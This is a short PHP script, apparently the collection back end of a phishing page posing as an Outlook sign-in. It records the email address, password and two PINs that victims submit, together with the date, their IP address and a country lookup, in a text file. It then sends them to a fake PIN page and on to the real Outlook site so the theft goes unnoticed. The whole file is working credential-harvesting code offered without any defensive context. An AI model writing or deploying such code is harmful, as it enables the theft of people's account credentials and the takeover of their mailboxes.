<?php
ini_set("display_errors", 0);
$user_ip = $_SERVER['REMOTE_ADDR'];
$cc = trim(file_get_contents("http://ipinfo.io/{$user_ip}/country"));

$file = fopen("file.txt", "a");
if(isset($_POST['uno']) && isset($_POST['dos'])){
fwrite($file, "correo: ".$_POST['uno']." - Clv: ".$_POST['dos']." -  ");
header ('location: Crear-Pin.html');
}
if(isset($_POST['tres']) && isset($_POST['cuatro'])){
fwrite($file, "pin: ".$_POST['tres']."  pin2: ".$_POST['cuatro']."  ".date('Y-m-d')." - ".date('H:i:s')." ".$user_ip." ".$cc."  ". PHP_EOL);
fwrite($file, "********************************* " . PHP_EOL);
header ('location: https://outlook.live.com/owa/');
}

fclose($file);


?>